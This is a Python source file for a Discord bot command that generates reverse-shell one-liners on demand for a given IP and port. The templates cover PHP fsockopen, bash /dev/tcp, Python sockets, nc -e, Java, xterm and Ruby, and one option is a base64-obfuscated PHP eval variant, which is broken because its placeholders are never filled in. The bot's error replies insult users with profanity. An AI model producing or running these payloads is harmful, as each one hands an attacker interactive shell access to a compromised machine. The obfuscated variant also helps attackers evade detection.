#!/usr/bin/env python3

import re
import base64
import discord
from discord.ext import commands


class Commands(commands.Cog):

	def __init__(self, client):
		self.client = client

	'''  Events '''

	@commands.Cog.listener()
	async def on_ready(self):
		print('\n...Commands module loaded correctly...')

	'''  Functions Check if the ip is real '''

	def check(self,Ip):

		regex = '''^(?:(25[0-5]|2[0-4][0-9]|1[0-9][0-9]|[1-9]?[0-9])\.){3}(25[0-5]|2[0-4][0-9]|1[0-9][0-9]|[1-9]?[0-9]]?)$''' 

		if ( re.search ( regex , Ip ) ) :  
			return True 
		else: 
			return False

	'''  Command for create a shell whit Style, ip, port '''

	@commands.command( help = "---> <php/php64, bash, py, nc, java, xterm, ruby> <ip> <port>``` ```")
	async def shell(self, ctx, style, ip, port, * , extra = None):

		''' Dictionary Shell '''

		shells = { 
		  'php': 	f'''```php\nphp -r '$sock=fsockopen("{ip}",{port});exec("/bin/sh -i <&3 >&3 2>&3");'\nphp -r '$sock=fsockopen("{ip}",{port});shell_exec("/bin/sh -i <&3 >&3 2>&3");'\nphp -r '$sock=fsockopen("{ip}",{port});escapeshellcmd("/bin/sh -i <&3 >&3 2>&3");'\nphp -r '$sock=fsockopen("{ip}",{port});system("/bin/sh -i <&3 >&3 2>&3");'\nphp -r '$sock=fsockopen("{ip}",{port});passthru("/bin/sh -i <&3 >&3 2>&3");'\nphp -r '$sock=fsockopen("{ip}",{port});popen("/bin/sh -i <&3 >&3 2>&3");'\n```''',
		  'php64': 	f'''```php\nb64 encoded\nphp -r '$sock=fsockopen("{ip}",{port});exec("/bin/sh -i <&3 >&3 2>&3");'\n```''',
		  'bash' :	f'''```bash\nbash -i >& /dev/tcp/{ip}/{port} 0>&1\n```''',
		  'py': f'''```python\npython -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{ip}",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'\n```''',
		  'nc': 	f'''```bash\nnc -e /bin/sh {ip} {port}\n```''',
		  'java': 	f'''```java\nr = Runtime.getRuntime()\np = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/{ip}/{port};cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])\np.waitFor()\n```''',
		  'xterm': 	f'''```xterm\nxterm -display {ip}:{port}\n```''',
		  'ruby': 	f'''```ruby\nruby -rsocket -e'f=TCPSocket.open("{ip}",{port}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'\n``` '''
		  }

		''' Check if the port number is a number '''

		if port.isdigit() == True:

			''' Lock the max inputs arguments '''

			if not extra:
				
				''' Check if the argument style exist '''

				if style.lower() in shells or style.lower() == 'all' :

					''' Check if the ip argument is a legit ip '''

					if self.check(ip) == True :			

						''' check if the port number is in the range 1 to 65535 '''

						if int(port) <= 65535 and int(port) > 0 :

							''' check if the style selection is all the style & print them '''

							if style.lower() == 'all':

								answer = ''

								for elements in shells :
									answer += f'```md\n+ <Shell {elements}>   <Ip {ip}>   <Port {port}>\n```'
									answer += shells[elements]

								await ctx.send(answer)

							else:

								if style.lower() == 'php64':
									user_shell = ''
									user_shell += f'```md\n+ <Shell {style}>  <Ip {ip}>   <Port {port}>\n```'
									
									enc_shell = base64.b64encode( '''$sock=fsockopen("{ip}",{port});exec("/bin/sh -i <&3 >&3 2>&3");'''.encode() )
									user_shell += f'''```php\nphp -r 'eval(base64_decode("{enc_shell.decode()}"))'\n'''

									enc_shell = base64.b64encode( '''$sock=fsockopen("{ip}",{port});shell_exec("/bin/sh -i <&3 >&3 2>&3");'''.encode() )
									user_shell += f'''php -r 'eval(base64_decode("{enc_shell.decode()}"))'\n'''

									enc_shell = base64.b64encode( '''$sock=fsockopen("{ip}",{port});escapeshellcmd("/bin/sh -i <&3 >&3 2>&3");'''.encode() )
									user_shell += f'''php -r 'eval(base64_decode("{enc_shell.decode()}"))'\n'''

									enc_shell = base64.b64encode( '''$sock=fsockopen("{ip}",{port});system("/bin/sh -i <&3 >&3 2>&3");'''.encode() )
									user_shell += f'''php -r 'eval(base64_decode("{enc_shell.decode()}"))'\n'''

									enc_shell = base64.b64encode( '''$sock=fsockopen("{ip}",{port});passthru("/bin/sh -i <&3 >&3 2>&3");'''.encode() )
									user_shell += f'''php -r 'eval(base64_decode("{enc_shell.decode()}"))'\n'''

									enc_shell = base64.b64encode( '''$sock=fsockopen("{ip}",{port});popen("/bin/sh -i <&3 >&3 2>&3");'''.encode() )
									user_shell += f'''php -r 'eval(base64_decode("{enc_shell.decode()}"))'\n```'''
									
								else:
									user_shell = ''
									user_shell += f'```md\n+ <Shell {style}>  <Ip {ip}>   <Port {port}>\n```'
									user_shell += shells[style.lower()]

								await ctx.send(user_shell)

						else:
							await ctx.send(f' ```diff\n- [{port}] Port number not valid...\n+ Wake up!...\n``` ')
					else:
						await ctx.send(f' ```diff\n- [{ip}] Ip address not valid...\n+ Retry fucker...\n``` ')
				else:
					await ctx.send(f' ```diff\n- [{style}] Shell type not valid... \n+ Retry cunt!\n``` ')
			else:
				await ctx.send(f' ```css\nTo many arguments.... Fuckers..\n``` ')
		else:
			await ctx.send(f' ```diff\n- [{port}] Only numbers allows on port input... \n+ No fucking way...!\n``` ')

	''' Error Handling Just for the shell commands '''

	@shell.error
	async def shell_error(self, ctx, error):
		if isinstance(error, commands.MissingRequiredArgument):
			await ctx.send('```diff\n- MissingRequiredArgument\n+ <php, bash, python, nc, java, xterm, ruby> <ip> <port>\n```')

def setup(client):
	client.add_cog(Commands(client))
